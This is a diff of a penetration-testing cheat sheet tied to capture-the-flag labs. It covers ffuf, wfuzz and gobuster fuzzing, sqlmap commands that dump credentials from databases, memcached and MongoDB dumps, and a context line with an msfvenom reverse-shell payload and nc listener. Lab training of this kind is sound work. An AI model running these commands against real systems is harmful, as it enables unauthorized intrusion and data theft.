@@ -1,6 +1,6 @@
 # Enumeration
 
-## **Stopped at** Blog
+## **Stopped at f**fuf
 
 ## **Scans**
 
@@ -214,12 +214,10 @@ http://$VICTIM/sitemap.xml
 
 ### Find Directories
 
-This looks for all php files under folder cvs
-
 **Kali**
 
 ```
-ffuf -u http://$VICTIM/cvs/FUZZ.php -w /usr/share/wfuzz/wordlist/general/common.txt
+ffuf -u http://$VICTIM/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 ```
 
 **Kali**
@@ -258,79 +256,96 @@ ffuf -u http://$VICTIM/static/FUZZ -w /usr/share/dirb/wordlists/big.txt
 dirsearch -u $VICTIM:$PORT 
 ```
 
-### SQLMap
+### Find pages with certain extensions
 
-#### Get information
+**Examples**
 
-Can be used to get things like usernames and passwords or other information in the tables.
+[#find-pages-with-certain-extensions](../walkthroughs/tryhackme/ffuf.md#find-pages-with-certain-extensions "mention")
+
+**Kali**
+
+```
+head /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt  
+```
+
+**web-extensions.txt**
+
+```
+.asp
+.aspx
+.bat
+.c
+.cfm
+.cgi
+.css
+.com
+.dll
+.exe
+```
+
+**Kali**
+
+```
+ffuf -u http://$VICTIM/indexFUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt  
+```
+
+### Find pages and exclude certain extensions
 
 **Example**
 
-[#sql](../walkthroughs/tryhackme/the-cod-caper.md#sql "mention")[expose.md](../walkthroughs/tryhackme/expose.md "mention")
+[#find-pages-and-exclude-certain-extensions](../walkthroughs/tryhackme/ffuf.md#find-pages-and-exclude-certain-extensions "mention")
 
 **Kali**
 
 ```
-sqlmap -u http://$VICTIM/$PAGE.php --forms --dump
-OR
-sqlmap -r request.txt --dbms=mysql --dump #Get request from Burp
+ffuf -u http://$VICTIM/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-
 ```
 
-
-
-**Get Databases**
-
-First capture the request of the page with Burp
-
-**Kali**
-
-```
-sudo sqlmap -r request.req --dbs
-```
-
-Get tables
-
-**Kali**
-
-```
-sudo sqlmap -r request.req --current-db $DATABASE --tables
-```
-
-Get fields for specified table&#x20;
-
-**Kali**
-
-```
-sudo sqlmap -r request.req --current-db $DATABASE --tables -T $TABLE --columns
-```
-
-Get values of specific fields
-
-**Kali**
-
-```
-sudo sqlmap -r request.req --current-db $DATABASE  --tables -T $TABLE  -C $FIELD1, $FIELD2 --dump
-```
-
-
-
-## Cookies
+### Using filters
 
 **Example**
 
-[#cookies](../walkthroughs/tryhackme/avengers-blog.md#cookies "mention")
+[#using-filters](../walkthroughs/tryhackme/ffuf.md#using-filters "mention")
 
-Get the flag with developer console by checking the cookie.
+By adding `-fc 403` (filter code) we'll hide from the output all 403 HTTP status codes.
 
-<figure><img src="../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>
+**Kali**
 
-## HTTP Headers
+```
+ffuf -u http://$VICTIM/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt -fc 403
+```
+
+
+
+Use `-mc 200` (match code) instead of having a long list of filtered codes.
+
+**Kali**
+
+```
+ffuf -u http://$VICTIM/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt -mc 200
+```
+
+We can use a regexp to match all files beginning with a dot.
+
+**Kali**
+
+```
+ffuf -u http://$VICTIM/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt -fr '/\..*'
+```
+
+### Fuzzing parameters
 
 **Example**
 
-[#http-headers](../walkthroughs/tryhackme/avengers-blog.md#http-headers "mention")
+[#fuzzing-parameters](../walkthroughs/tryhackme/ffuf.md#fuzzing-parameters "mention")
 
-<figure><img src="../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>
+ffuf allows you to put the keyword anywhere we can use it to fuzz for parameters.
+
+**Kali**
+
+```
+ffuf -u http://$VICTIM/sqli-labs/Less-1/?FUZZ=1 -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fw 39
+```
 
 
 
@@ -392,6 +407,162 @@ nmap -p 80 $VICTIM --script http-shellshock
 ```
 nmap -p 443  $VICTIM --script ssl-heartbleed
 ```
+
+### Fuzzing Subdomains
+
+**Example**
+
+[#fuzzing-domains](../walkthroughs/tryhackme/cmess.md#fuzzing-domains "mention")
+
+**Kali**
+
+```
+wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u 'http://$URL.thm/' -H "Host: FUZZ.$URL.thm" > results.txt
+
+grep -v '290 W' results.txt
+```
+
+**Example**
+
+[#fuzz-subdomain](../walkthroughs/tryhackme/vulnnet.md#fuzz-subdomain "mention")
+
+**Kali**
+
+```
+gobuster vhost -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$URL.thm  
+```
+
+**Example**
+
+[#finding-vhosts-and-subdomains](../walkthroughs/tryhackme/ffuf.md#finding-vhosts-and-subdomains "mention")
+
+**Kali**
+
+```
+ffuf -u http://FUZZ.$URL.thm -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+```
+
+### Proxifying ffuf traffic
+
+Example
+
+[#proxifying-ffuf-traffic](../walkthroughs/tryhackme/ffuf.md#proxifying-ffuf-traffic "mention")
+
+**Kali**
+
+```
+ffuf -u http://$VICTIM -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x http://127.0.0.1:8080
+```
+
+It's also possible to send only matches to your proxy for replaying:
+
+**Kali**
+
+```
+ffuf -u http://$VICTIM  -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -replay-proxy http://127.0.0.1:8080
+```
+
+
+
+
+
+
+
+### SQLMap
+
+#### Get information
+
+Can be used to get things like usernames and passwords or other information in the tables.
+
+**Example**
+
+[#sql](../walkthroughs/tryhackme/the-cod-caper.md#sql "mention")[expose.md](../walkthroughs/tryhackme/expose.md "mention")
+
+**Kali**
+
+```
+sqlmap -u http://$VICTIM/$PAGE.php --forms --dump
+OR
+sqlmap -r request.txt --dbms=mysql --dump #Get request from Burp
+```
+
+
+
+#### **Get Databases**
+
+**Examples**
+
+[olympus.md](../walkthroughs/tryhackme/olympus.md "mention")[gallery.md](../walkthroughs/tryhackme/gallery.md "mention")
+
+First capture the request of the page with Burp
+
+**Kali**
+
+```
+sudo sqlmap -r request.req --dbs
+```
+
+Get tables
+
+**Kali**
+
+```
+sudo sqlmap -r request.req --current-db $DATABASE --tables
+```
+
+Get fields for specified table&#x20;
+
+**Kali**
+
+```
+sudo sqlmap -r request.req --current-db $DATABASE --tables -T $TABLE --columns
+```
+
+Get values of specific fields
+
+**Kali**
+
+```
+sudo sqlmap -r request.req --current-db $DATABASE  --tables -T $TABLE  -C $FIELD1, $FIELD2 --dump
+```
+
+
+
+#### **Rescan SQLMap**
+
+SQLMap will just give you the same results if you keep trying the same command, even if things have changed. Remove the cache to resolve this.
+
+**Kali**
+
+```
+rm -rf /root/.sqlmap/output/$HOST.thm/
+```
+
+
+
+## Cookies
+
+**Example**
+
+[#cookies](../walkthroughs/tryhackme/avengers-blog.md#cookies "mention")
+
+Get the flag with developer console by checking the cookie.
+
+<figure><img src="../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>
+
+## HTTP Headers
+
+**Example**
+
+[#http-headers](../walkthroughs/tryhackme/avengers-blog.md#http-headers "mention")
+
+<figure><img src="../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+###
 
 
 
@@ -842,7 +1013,7 @@ $VICTIM:6379> LRANGE "$VALUE" 1 100
 
 ## TCP/7070 - AnyConnect
 
-**F**
+**Example**
 
 [annie.md](../walkthroughs/tryhackme/annie.md "mention")
 
@@ -862,8 +1033,49 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -b "\x00\x25\x26"
 nc -lvnp 4444
 ```
 
-###
+## TCP/11211 - Memcache&#x20;
 
-####
+### Dump cache
+
+**Example**
+
+[#tcp-11211-memcache](../walkthroughs/tryhackme/wekor.md#tcp-11211-memcache "mention")
+
+**Victim**
+
+```
+cd /usr/share/memcached/scripts/  
+./memcached-tool localhost:1121 dump
+```
+
+
+
+## TCP/27017 - MongoDB
+
+**Example**
+
+[#tcp-27017-mongo](../walkthroughs/tryhackme/road.md#tcp-27017-mongo "mention")
+
+### Find Info in DB
+
+**Victim**
+
+```
+mongo
+```
+
+**Victim(mongo)**
+
+```
+show dbs
+use $DBSNAME
+show collections
+db.$FIELD.find();
+exit
+```
+
+
+
+
 
 \
